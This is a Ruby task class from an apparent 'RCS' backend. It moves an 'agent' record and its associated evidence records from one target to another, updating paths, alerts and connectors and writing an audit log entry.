require_relative '../tasks'

module RCS
module DB

class MoveagentTask
  include RCS::DB::NoFileTaskType
  include RCS::Tracer

  def total
    @target = ::Item.targets.find(@params['target'])
    @agent = ::Item.find(@params['_id'])
    @old_target = @agent.get_parent

    evidence_count = 0

    # factories don't have evidence to be moved
    if @agent._kind == 'agent'
      evidences = Evidence.target(@old_target[:_id]).where(:aid => @agent[:_id])
      evidence_count = evidences.count
    end

    return evidence_count + 2
  end
  
  def next_entry
    yield @description = "Moving #{@agent[:name]} to #{@target[:name]}"

    # actually move the target now.
    @agent.path = @target.path + [@target._id]
    @agent.users = @target.users
    @agent.save

    # update the path in alerts and connectors
    replace = {0 => @target.path[0], 1 => @target.path[1]}
    ::Connector.where(path: @agent.id).each { |c| c.update_path(replace) }
    ::Alert.where(path: @agent.id).each { |a| a.update_path(replace) }

    Audit.log :actor => @params[:user][:name],
              :action => "#{@agent._kind}.move",
              :_item => @agent,
              :desc => "Moved #{@agent._kind} '#{@agent[:name]}' to #{@target[:name]}"

    if @agent._kind == 'agent'
      yield @description = "Moving #{@total} evidence of #{@agent[:name]} to #{@target[:name]}"

      task = {name: "move evidence of #{@agent.name} from #{@old_target.name} to #{@target.name}",
              method: "::Evidence.offload_move_evidence",
              params: {old_target_id: @old_target[:_id], target_id: @target[:_id], agent_id: @agent[:_id]}}

      task = OffloadManager.instance.add_task(task)

      ::Evidence.offload_move_evidence(task[:params]) do
        yield
      end

      OffloadManager.instance.remove_task(task)
    end

    @description = "#{@agent[:name]} moved successfully"
  end
end

end # DB
end # RCS